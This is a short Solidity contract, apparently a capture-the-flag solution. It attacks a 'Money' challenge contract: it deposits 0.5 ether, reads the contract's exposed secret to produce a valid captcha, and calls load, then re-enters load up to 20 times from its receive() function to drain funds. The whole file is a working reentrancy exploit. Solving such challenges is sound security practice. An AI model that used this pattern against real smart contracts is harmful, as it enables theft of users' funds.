// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Setup, Money, Captcha} from "src/contracts/Setup.sol";

contract ExploitMoney {
    Setup public setup;
    Money public money;
    Captcha public captcha;
    uint256 num = 0;

    constructor() payable {
        require(msg.value == 0.5 ether);
        setup = Setup(0x7111114EC1140983842603037Ce266168793b399);
        money = Money(setup.moneyContract());
        captcha = Captcha(setup.captchaContract());
    }

    function Exploit() public payable {
        money.save{value: 0.5 ether}();
        uint256 secret = money.secret();
        uint256 gen_captcha = captcha.generateCaptcha(secret);
        money.load(gen_captcha);
    }

    receive() external payable {
        if (num < 20) {
            num++;
            uint256 secret = money.secret();
            uint256 gen_captcha = captcha.generateCaptcha(secret);
            money.load(gen_captcha);
        }
    }
}
